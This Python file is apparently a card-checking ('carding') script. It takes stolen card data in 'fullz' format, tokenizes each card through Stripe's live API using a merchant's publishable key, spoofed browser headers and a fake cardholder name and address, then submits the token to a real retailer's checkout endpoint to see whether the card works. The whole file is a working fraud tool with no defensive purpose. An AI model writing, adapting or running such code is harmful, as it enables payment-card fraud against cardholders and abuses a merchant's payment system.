import asyncio
import random
from fake_useragent import UserAgent
import requests
from FUNC.defs import *
import re
from bs4 import BeautifulSoup



session = requests.session()
        
def gets(s, start, end):
            try:
                start_index = s.index(start) + len(start)
                end_index = s.index(end, start_index)
                return s[start_index:end_index]
            except ValueError:
                return None



async def create_cvv_charge(fullz , session):
    try:
        cc , mes , ano , cvv = fullz.split("|")


        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        }

        data={
            'muid':'1e19d4eb-c05d-4b47-9f9d-93d9a22af8f83ff86b',
            'sid':'ca95975c-323b-46c1-99ea-2e7ce99b39245c7897',
            'guid':'NA',
            'referrer':'https://ruggedridge.com',
            'time_on_page':'84343',
            'card[name]':'Crish Niki',
            'card[address_line1]':'1701 W Ashley Rd',
            'card[address_city]':'Boonville',
            'card[address_state]':'NY',
            'card[address_zip]':'10001',
            'card[address_country]':'US',
            'card[currency]':'usd',
            'card[number]':cc,
            'card[cvc]':cvv,
            'card[exp_month]':mes,
            'card[exp_year]':ano,
            'payment_user_agent':'stripe.js/019cc90856; stripe-js-v3/019cc90856; card-element',
            'pasted_fields':'number',
            'key':'pk_live_XotCD0jxWE7pAhaCLmt5PC5l'
            }
        


        response = await session.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)



        # print(response.text)



        try:
            id= response.json()['id']
            card= response.json()['card']['id']
            # print(id)
            # print(card)
        except:
            return response.text

        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://ruggedridge.com',
            'priority': 'u=1, i',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            'x-forter-token': '9515561b396a424386d5f723402c58a2_1725558251554__UDF43-m4_15ck__tt',
            'x-site': 'rr',
        }

        json_data = {
            'raw': {
                'token': {
                    'id': id,
                    'object': 'token',
                    'card': {
                        'id': card,
                        'object': 'card',
                        'address_city': 'Boonville',
                        'address_country': 'US',
                        'address_line1': '1701 W Ashley Rd',
                        'address_line1_check': 'unchecked',
                        'address_line2': None,
                        'address_state': 'NY',
                        'address_zip': '10001',
                        'address_zip_check': 'unchecked',
                        'brand': 'Visa',
                        'country': 'US',
                        'currency': 'usd',
                        'cvc_check': 'unchecked',
                        'dynamic_last4': None,
                        'exp_month': 5,
                        'exp_year': 2035,
                        'funding': 'debit',
                        'last4': '3524',
                        'name': 'Crish Niki',
                        'networks': {
                            'preferred': None,
                        },
                        'tokenization_method': None,
                        'wallet': None,
                    },
                    'client_ip': '103.42.228.17',
                    'created': 1725558416,
                    'livemode': True,
                    'type': 'card',
                    'used': False,
                },
            },
            'token': id,
        }

        response = await session.post(
            'https://uwp.thiecommerce.com/uwp-v3/checkouts/1725557957990.2527/STRIPE',
            headers=headers,
            json=json_data,
        )


        # print(response.text)

        return response.text

    except Exception as e:
        return str(e)
    



